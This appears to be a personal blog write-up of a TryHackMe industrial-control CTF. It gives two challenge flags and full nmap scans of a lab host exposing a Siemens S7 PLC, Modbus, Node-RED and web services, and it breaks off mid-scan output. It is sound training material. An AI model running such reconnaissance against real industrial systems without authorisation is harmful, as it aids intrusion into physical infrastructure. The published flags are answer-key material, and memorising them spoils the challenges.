---
title: Industrial Intrusion
date: 2025-07-11 22:26:00 +0100
categories: [ctf, thm]
tags: [cryptography, networking, pwn, boot2root, reversing, web]     
image: https://res.cloudinary.com/djo6idowf/image/upload/v1752269515/image_llmkbe.webp
---
TryHackMe hosted a CTF a couple weeks back - something that I wasn’t previously aware that they did as a platform. I was already setup for another CTF that was happening at the same time but I was persuaded to check this one out. Glad I did, it was a decent event - albeit it has some issues.

**Currently there aren’t any official write-ups for this event but if that changes I will put the link here.**

## Discord

Category: Discord

### Description

Join our Discord server and find the flag?

Flag: `THM{D15C0RD_57A5H_C0MM4ND5}`

### Write-up

Head on over to the Discord server, find the `#bot-commands` channel and then use `/secret-function` in the chat window.

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316756/image_j3suuf.png)

### Thoughts

Simple. CTFs should have more of these extremely beginner friendly challenges.

## Breach

Category: Misc

### Description

This engagement aims to find a way to open the gate by bypassing the badge authentication system.
The control infrastructure may hold a weakness: Dig in, explore, and see if you have what it takes to exploit it.
Be sure to check all the open ports, you never know which one might be your way in!

Flag: `THM{s4v3_th3_d4t3_27_jun3}`

### Write-up

`nmap -A -T4 10.10.141.90`

```plain text
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-27 19:55 UTC
Nmap scan report for ip-10-10-141-90.eu-west-1.compute.internal (10.10.141.90)
Host is up (0.00053s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE    VERSION
22/tcp   open  ssh        OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aafdaaabe465465c21ba30c98a3f00c2 (ECDSA)
|_  256 898e638c7d7cd69c1d63eed0369d27a8 (ED25519)
80/tcp   open  http       Werkzeug/3.1.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.3
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Content-Disposition: inline; filename=index.html
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1608
|     Last-Modified: Mon, 23 Jun 2025 00:44:37 GMT
|     Cache-Control: no-cache
|     ETag: "1750639477.176184-1608-3272805344"
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Gate Monitor</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background: #f4f4f4;
|     text-align: center;
|     padding-top: 50px;
|     color: #007acc;
|     #status {
|     font-size: 1.5em;
|     margin-top: 20px;
|     #flag {
|     margin-top: 10px;
|     font-size: 1.3em;
|     font-weight: bold;
|     color: #c62828;
|     width: 300px;
|     height: auto;
|     margin-top:
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.3
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Gate Monitor
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
8080/tcp open  http-proxy Werkzeug/2.3.7 Python/3.12.3
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Vary: Cookie
|     Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.aF73Qw.xXvMq1bhPaLJ9FPJ5nXEyUtP5j4; Expires=Fri, 27 Jun 2025 20:00:47 GMT; HttpOnly; Path=/
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Vary: Cookie
|     Set-Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.aF73Qw.Co9hgMB0ke9WrRVPsoIDAAaisWA; Expires=Fri, 27 Jun 2025 20:00:47 GMT; HttpOnly; Path=/
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 19:55:47 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Vary: Cookie
|     Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.aF73Qw.xXvMq1bhPaLJ9FPJ5nXEyUtP5j4; Expires=Fri, 27 Jun 2025 20:00:47 GMT; HttpOnly; Path=/
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-server-header: Werkzeug/2.3.7 Python/3.12.3
2 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=6/27%Time=685EF743%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,7C0,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Py
SF:thon/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2019:55:47\x20GMT\
SF:r\nContent-Disposition:\x20inline;\x20filename=index\.html\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201608\r\nLast-
SF:Modified:\x20Mon,\x2023\x20Jun\x202025\x2000:44:37\x20GMT\r\nCache-Cont
SF:rol:\x20no-cache\r\nETag:\x20\"1750639477\.176184-1608-3272805344\"\r\n
SF:Date:\x20Fri,\x2027\x20Jun\x202025\x2019:55:47\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x
SF:20<meta\x20charset=\"UTF-8\">\n\x20\x20<title>Gate\x20Monitor</title>\n
SF:\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20fon
SF:t-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20background:
SF:\x20#f4f4f4;\n\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\
SF:x20\x20\x20\x20padding-top:\x2050px;\n\x20\x20\x20\x20}\n\x20\x20\x20\x
SF:20h1\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#007acc;\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20#status\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x20
SF:1\.5em;\n\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20#flag\x20{\n\x20\x20\x20\x20\x20\x20margin-top:\x201
SF:0px;\n\x20\x20\x20\x20\x20\x20font-size:\x201\.3em;\n\x20\x20\x20\x20\x
SF:20\x20font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20color:\x20#c62828;
SF:\n\x20\x20\x20\x20}\n\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20
SF:width:\x20300px;\n\x20\x20\x20\x20\x20\x20height:\x20auto;\n\x20\x20\x2
SF:0\x20\x20\x20margin-top:\x20")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK
SF:\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.12\.3\r\nDate:\x20Fri,\x20
SF:27\x20Jun\x202025\x2019:55:47\x20GMT\r\nContent-Type:\x20text/html;\x20
SF:charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\
SF:x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20
SF:HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x2
SF:0\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response<
SF:/h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x
SF:20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20co
SF:de\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20uns
SF:upported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port8080-TCP:V=7.93%I=7%D=6/27%Time=685EF743%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,238,"HTTP/1\.1\x20302\x20FOUND\r\nServer:\x20Werkzeug/2\.3\.7\
SF:x20Python/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2019:55:47\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20199\r\nLocation:\x20/login\r\nVary:\x20Cookie\r\nSet-Cookie:\x20ses
SF:sion=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ\.aF73Qw\.Co9hgMB0ke
SF:9WrRVPsoIDAAaisWA;\x20Expires=Fri,\x2027\x20Jun\x202025\x2020:00:47\x20
SF:GMT;\x20HttpOnly;\x20Path=/\r\nConnection:\x20close\r\n\r\n<!doctype\x2
SF:0html>\n<html\x20lang=en>\n<title>Redirecting\.\.\.</title>\n<h1>Redire
SF:cting\.\.\.</h1>\n<p>You\x20should\x20be\x20redirected\x20automatically
SF:\x20to\x20the\x20target\x20URL:\x20<a\x20href=\"/login\">/login</a>\.\x
SF:20If\x20not,\x20click\x20the\x20link\.\n")%r(HTTPOptions,161,"HTTP/1\.1
SF:\x20200\x20OK\r\nServer:\x20Werkzeug/2\.3\.7\x20Python/3\.12\.3\r\nDate
SF::\x20Fri,\x2027\x20Jun\x202025\x2019:55:47\x20GMT\r\nContent-Type:\x20t
SF:ext/html;\x20charset=utf-8\r\nAllow:\x20GET,\x20HEAD,\x20OPTIONS\r\nVar
SF:y:\x20Cookie\r\nSet-Cookie:\x20session=eyJfcGVybWFuZW50Ijp0cnVlfQ\.aF73
SF:Qw\.xXvMq1bhPaLJ9FPJ5nXEyUtP5j4;\x20Expires=Fri,\x2027\x20Jun\x202025\x
SF:2020:00:47\x20GMT;\x20HttpOnly;\x20Path=/\r\nContent-Length:\x200\r\nCo
SF:nnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20HTML>\n<ht
SF:ml\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x20\x20<titl
SF:e>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x20\x20\x20<
SF:body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response</h1>\n\x20
SF:\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x20\x20\x20\
SF:x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x20\('RTSP/
SF:1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code\x20expl
SF:anation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20unsupported\x
SF:20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n")%r(FourOhFourReques
SF:t,21E,"HTTP/1\.1\x20404\x20NOT\x20FOUND\r\nServer:\x20Werkzeug/2\.3\.7\
SF:x20Python/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2019:55:47\x2
SF:0GMT\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:
SF:\x20207\r\nVary:\x20Cookie\r\nSet-Cookie:\x20session=eyJfcGVybWFuZW50Ij
SF:p0cnVlfQ\.aF73Qw\.xXvMq1bhPaLJ9FPJ5nXEyUtP5j4;\x20Expires=Fri,\x2027\x2
SF:0Jun\x202025\x2020:00:47\x20GMT;\x20HttpOnly;\x20Path=/\r\nConnection:\
SF:x20close\r\n\r\n<!doctype\x20html>\n<html\x20lang=en>\n<title>404\x20No
SF:t\x20Found</title>\n<h1>Not\x20Found</h1>\n<p>The\x20requested\x20URL\x
SF:20was\x20not\x20found\x20on\x20the\x20server\.\x20If\x20you\x20entered\
SF:x20the\x20URL\x20manually\x20please\x20check\x20your\x20spelling\x20and
SF:\x20try\x20again\.</p>\n");
MAC Address: 02:08:F3:02:83:CB (Unknown)
No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).
TCP/IP fingerprint:
OS:SCAN(V=7.93%E=4%D=6/27%OT=22%CT=1%CU=37075%PV=Y%DS=1%DC=D%G=Y%M=0208F3%T
OS:M=685EF7A5%P=x86_64-pc-linux-gnu)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%II=I
OS:%TS=A)SEQ(SP=104%GCD=1%ISR=10C%TI=Z%CI=Z%TS=A)OPS(O1=M2301ST11NW7%O2=M23
OS:01ST11NW7%O3=M2301NNT11NW7%O4=M2301ST11NW7%O5=M2301ST11NW7%O6=M2301ST11)
OS:WIN(W1=F4B3%W2=F4B3%W3=F4B3%W4=F4B3%W5=F4B3%W6=F4B3)ECN(R=Y%DF=Y%T=40%W=
OS:F507%O=M2301NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+%F=AS%RD=0%Q=)T2(R=N
OS:)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T5(R=Y%DF=Y%T=40%W=0
OS:%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)T7
OS:(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)U1(R=Y%DF=N%T=40%IPL=164%UN=
OS:0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%T=40%CD=S)

Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.53 ms ip-10-10-141-90.eu-west-1.compute.internal (10.10.141.90)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 104.63 seconds

```

![](https://res.cloudinary.com/djo6idowf/image/upload/v1751316760/image_m4iluy.png)

Did another scan with more ports added `-p-` to the command.

```plain text
Starting Nmap 7.93 ( https://nmap.org ) at 2025-06-27 20:09 UTC
Nmap scan report for ip-10-10-141-90.eu-west-1.compute.internal (10.10.141.90)
Host is up (0.00057s latency).
Not shown: 65528 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
22/tcp    open  ssh           OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 aafdaaabe465465c21ba30c98a3f00c2 (ECDSA)
|_  256 898e638c7d7cd69c1d63eed0369d27a8 (ED25519)
80/tcp    open  http          Werkzeug/3.1.3 Python/3.12.3
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.3
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Content-Disposition: inline; filename=index.html
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1608
|     Last-Modified: Mon, 23 Jun 2025 00:44:37 GMT
|     Cache-Control: no-cache
|     ETag: "1750639477.176184-1608-3272805344"
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html lang="en">
|     <head>
|     <meta charset="UTF-8">
|     <title>Gate Monitor</title>
|     <style>
|     body {
|     font-family: Arial, sans-serif;
|     background: #f4f4f4;
|     text-align: center;
|     padding-top: 50px;
|     color: #007acc;
|     #status {
|     font-size: 1.5em;
|     margin-top: 20px;
|     #flag {
|     margin-top: 10px;
|     font-size: 1.3em;
|     font-weight: bold;
|     color: #c62828;
|     width: 300px;
|     height: auto;
|     margin-top:
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/3.1.3 Python/3.12.3
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: HEAD, OPTIONS, GET
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
|_http-title: Gate Monitor
102/tcp   open  iso-tsap      Siemens S7 PLC
| fingerprint-strings: 
|   TerminalServerCookie: 
|_    Cookie: mstshash=nmap
| s7-info: 
|   Module: 6ES7 315-2EH14-0AB0 
|   Basic Hardware: 6ES7 315-2EH14-0AB0 
|   Version: 3.2.6
|   System Name: SNAP7-SERVER
|   Module Type: CPU 315-2 PN/DP
|   Serial Number: S C-C2UR28922012
|_  Copyright: Original Siemens Equipment
502/tcp   open  mbap?
| fingerprint-strings: 
|   NCP: 
|_    DmdT
1880/tcp  open  vsat-control?
| fingerprint-strings: 
|   DNSVersionBindReqTCP, RPCCheck: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   GetRequest: 
|     HTTP/1.1 200 OK
|     Access-Control-Allow-Origin: *
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 1733
|     ETag: W/"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0"
|     Date: Fri, 27 Jun 2025 20:10:14 GMT
|     Connection: close
|     <!DOCTYPE html>
|     <html>
|     <head>
|     <meta charset="utf-8">
|     <meta http-equiv="X-UA-Compatible" content="IE=edge">
|     <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=0">
|     <meta name="apple-mobile-web-app-capable" content="yes">
|     <meta name="mobile-web-app-capable" content="yes">
|     <!--
|     Copyright OpenJS Foundation and other contributors, https://openjsf.org/
|     Licensed under the Apache License, Version 2.0 (the "License");
|     this file except in compliance with the License.
|     obtain a copy of the License at
|     http://www.apache.org/licenses/LICENSE-2.0
|     Unless required by applicable law or agreed to in writing, softwa
|   HTTPOptions, RTSPRequest: 
|     HTTP/1.1 204 No Content
|     Access-Control-Allow-Origin: *
|     Access-Control-Allow-Methods: GET,PUT,POST,DELETE
|     Vary: Access-Control-Request-Headers
|     Content-Length: 0
|     Date: Fri, 27 Jun 2025 20:10:14 GMT
|_    Connection: close
8080/tcp  open  http-proxy    Werkzeug/2.3.7 Python/3.12.3
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.1 404 NOT FOUND
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 207
|     Vary: Cookie
|     Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.aF76oQ.bZ8YWBG8a7Z9V9pR06B-B0duoXE; Expires=Fri, 27 Jun 2025 20:15:09 GMT; HttpOnly; Path=/
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>404 Not Found</title>
|     <h1>Not Found</h1>
|     <p>The requested URL was not found on the server. If you entered the URL manually please check your spelling and try again.</p>
|   GetRequest: 
|     HTTP/1.1 302 FOUND
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Content-Length: 199
|     Location: /login
|     Vary: Cookie
|     Set-Cookie: session=eyJfZnJlc2giOmZhbHNlLCJfcGVybWFuZW50Ijp0cnVlfQ.aF76oQ.2ydPOa8MwXrr90Ip2ke5TqKlo20; Expires=Fri, 27 Jun 2025 20:15:09 GMT; HttpOnly; Path=/
|     Connection: close
|     <!doctype html>
|     <html lang=en>
|     <title>Redirecting...</title>
|     <h1>Redirecting...</h1>
|     <p>You should be redirected automatically to the target URL: <a href="/login">/login</a>. If not, click the link.
|   HTTPOptions: 
|     HTTP/1.1 200 OK
|     Server: Werkzeug/2.3.7 Python/3.12.3
|     Date: Fri, 27 Jun 2025 20:10:09 GMT
|     Content-Type: text/html; charset=utf-8
|     Allow: GET, HEAD, OPTIONS
|     Vary: Cookie
|     Set-Cookie: session=eyJfcGVybWFuZW50Ijp0cnVlfQ.aF76oQ.bZ8YWBG8a7Z9V9pR06B-B0duoXE; Expires=Fri, 27 Jun 2025 20:15:09 GMT; HttpOnly; Path=/
|     Content-Length: 0
|     Connection: close
|   RTSPRequest: 
|     <!DOCTYPE HTML>
|     <html lang="en">
|     <head>
|     <meta charset="utf-8">
|     <title>Error response</title>
|     </head>
|     <body>
|     <h1>Error response</h1>
|     <p>Error code: 400</p>
|     <p>Message: Bad request version ('RTSP/1.0').</p>
|     <p>Error code explanation: 400 - Bad request syntax or unsupported method.</p>
|     </body>
|_    </html>
| http-title: Site doesn't have a title (text/html; charset=utf-8).
|_Requested resource was /login
|_http-server-header: Werkzeug/2.3.7 Python/3.12.3
44818/tcp open  EtherNetIP-2?
4 services unrecognized despite returning data. If you know the service/version, please submit the following fingerprints at https://nmap.org/cgi-bin/submit.cgi?new-service :
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port80-TCP:V=7.93%I=7%D=6/27%Time=685EFAA0%P=x86_64-pc-linux-gnu%r(GetR
SF:equest,7C0,"HTTP/1\.1\x20200\x20OK\r\nServer:\x20Werkzeug/3\.1\.3\x20Py
SF:thon/3\.12\.3\r\nDate:\x20Fri,\x2027\x20Jun\x202025\x2020:10:09\x20GMT\
SF:r\nContent-Disposition:\x20inline;\x20filename=index\.html\r\nContent-T
SF:ype:\x20text/html;\x20charset=utf-8\r\nContent-Length:\x201608\r\nLast-
SF:Modified:\x20Mon,\x2023\x20Jun\x202025\x2000:44:37\x20GMT\r\nCache-Cont
SF:rol:\x20no-cache\r\nETag:\x20\"1750639477\.176184-1608-3272805344\"\r\n
SF:Date:\x20Fri,\x2027\x20Jun\x202025\x2020:10:09\x20GMT\r\nConnection:\x2
SF:0close\r\n\r\n<!DOCTYPE\x20html>\n<html\x20lang=\"en\">\n<head>\n\x20\x
SF:20<meta\x20charset=\"UTF-8\">\n\x20\x20<title>Gate\x20Monitor</title>\n
SF:\x20\x20<style>\n\x20\x20\x20\x20body\x20{\n\x20\x20\x20\x20\x20\x20fon
SF:t-family:\x20Arial,\x20sans-serif;\n\x20\x20\x20\x20\x20\x20background:
SF:\x20#f4f4f4;\n\x20\x20\x20\x20\x20\x20text-align:\x20center;\n\x20\x20\
SF:x20\x20\x20\x20padding-top:\x2050px;\n\x20\x20\x20\x20}\n\x20\x20\x20\x
SF:20h1\x20{\n\x20\x20\x20\x20\x20\x20color:\x20#007acc;\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20#status\x20{\n\x20\x20\x20\x20\x20\x20font-size:\x20
SF:1\.5em;\n\x20\x20\x20\x20\x20\x20margin-top:\x2020px;\n\x20\x20\x20\x20
SF:}\n\x20\x20\x20\x20#flag\x20{\n\x20\x20\x20\x20\x20\x20margin-top:\x201
SF:0px;\n\x20\x20\x20\x20\x20\x20font-size:\x201\.3em;\n\x20\x20\x20\x20\x
SF:20\x20font-weight:\x20bold;\n\x20\x20\x20\x20\x20\x20color:\x20#c62828;
SF:\n\x20\x20\x20\x20}\n\x20\x20\x20\x20img\x20{\n\x20\x20\x20\x20\x20\x20
SF:width:\x20300px;\n\x20\x20\x20\x20\x20\x20height:\x20auto;\n\x20\x20\x2
SF:0\x20\x20\x20margin-top:\x20")%r(HTTPOptions,C7,"HTTP/1\.1\x20200\x20OK
SF:\r\nServer:\x20Werkzeug/3\.1\.3\x20Python/3\.12\.3\r\nDate:\x20Fri,\x20
SF:27\x20Jun\x202025\x2020:10:09\x20GMT\r\nContent-Type:\x20text/html;\x20
SF:charset=utf-8\r\nAllow:\x20HEAD,\x20OPTIONS,\x20GET\r\nContent-Length:\
SF:x200\r\nConnection:\x20close\r\n\r\n")%r(RTSPRequest,16C,"<!DOCTYPE\x20
SF:HTML>\n<html\x20lang=\"en\">\n\x20\x20\x20\x20<head>\n\x20\x20\x20\x20\
SF:x20\x20\x20\x20<meta\x20charset=\"utf-8\">\n\x20\x20\x20\x20\x20\x20\x2
SF:0\x20<title>Error\x20response</title>\n\x20\x20\x20\x20</head>\n\x20\x2
SF:0\x20\x20<body>\n\x20\x20\x20\x20\x20\x20\x20\x20<h1>Error\x20response<
SF:/h1>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20code:\x20400</p>\n\x2
SF:0\x20\x20\x20\x20\x20\x20\x20<p>Message:\x20Bad\x20request\x20version\x
SF:20\('RTSP/1\.0'\)\.</p>\n\x20\x20\x20\x20\x20\x20\x20\x20<p>Error\x20co
SF:de\x20explanation:\x20400\x20-\x20Bad\x20request\x20syntax\x20or\x20uns
SF:upported\x20method\.</p>\n\x20\x20\x20\x20</body>\n</html>\n");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port502-TCP:V=7.93%I=7%D=6/27%Time=685EFAC1%P=x86_64-pc-linux-gnu%r(X11
SF:Probe,12,"l\0\x0b\0\0\x03\0\x80\x01\0\0\0\0\0\x03\0\x80\x01")%r(LDAPSea
SF:rchReq,9,"0\x84\0\0\0\x03\x02\x81\x02")%r(NCP,12,"DmdT\0\x03\0\x80\x01\
SF:0\x17\0\0\0\x03\0\x80\x01")%r(ms-sql-s,9,"\x12\x01\x004\0\x03\0\x80\x01
SF:")%r(afp,12,"\0\x03\0\x01\0\x03\x06\x81\x01\0\0\0\0\0\x03\0\x80\x01");
==============NEXT SERVICE FINGERPRINT (SUBMIT INDIVIDUALLY)==============
SF-Port1880-TCP:V=7.93%I=7%D=6/27%Time=685EFAA5%P=x86_64-pc-linux-gnu%r(Ge
SF:tRequest,799,"HTTP/1\.1\x20200\x20OK\r\nAccess-Control-Allow-Origin:\x2
SF:0\*\r\nContent-Type:\x20text/html;\x20charset=utf-8\r\nContent-Length:\
SF:x201733\r\nETag:\x20W/\"6c5-hGVEFL4qpfS9qVbAlfbm9AL7VT0\"\r\nDate:\x20F
SF:ri,\x2027\x20Jun\x202025\x2020:10:14\x20GMT\r\nConnection:\x20close\r\n
SF:\r\n<!DOCTYPE\x20html>\n<html>\n<head>\n<meta\x20charset=\"utf-8\">\n<m
SF:eta\x20http-equiv=\"X-UA-Compatible\"\x20content=\"IE=edge\">\n<meta\x2
SF:0name=\"viewport\"\x20content=\"width=device-width,\x20initial-scale=1,
SF:\x20maximum-scale=1,\x20user-scalable=0\">\n<meta\x20name=\"apple-mobil
SF:e-web-app-capable\"\x20content=\"yes\">\n<meta\x20name=\"mobile-web-app
SF:-capable\"\x20content=\"yes\">\n<!--\n\x20\x20Copyright\x20OpenJS\x20Fo
SF:undation\x20and\x20other\x20contributors,\x20https://openjsf\.org/\n\n\
SF:x20\x20Licensed\x20under\x20the\x20Apache\x20License,\x20Version\x202\.
SF:0\x20\(the\x20\"License\"\);\n\x20\x20you\x20may\x20not\x20use\x20this\
SF:x20file\x20except\x20in\x20compliance\x20with\x20the\x20License\.\n\x20
SF:\x20You\x20may\x20obtain\x20a\x20copy\x20of\x20the\x20License\x20at\n\n
SF:\x20\x20http://www\.apache\.org/licenses/LICENSE-2\.0\n\n\x20\x20Unless
SF:\x20required\x20by\x20applicable\x20law\x20or\x20agreed\x20to\x20in\x20
SF:writing,\x20softwa")%r(HTTPOptions,DF,"HTTP/1\.1\x20204\x20No\x20Conten
SF:t\r\nAccess-Control-Allow-Origin:\x20\*\r\nAccess-Control-Allow-Methods
SF::\x20GET,PUT,POST,DELETE\r\nVary:\x20Access-Control-Request-Headers\r\n
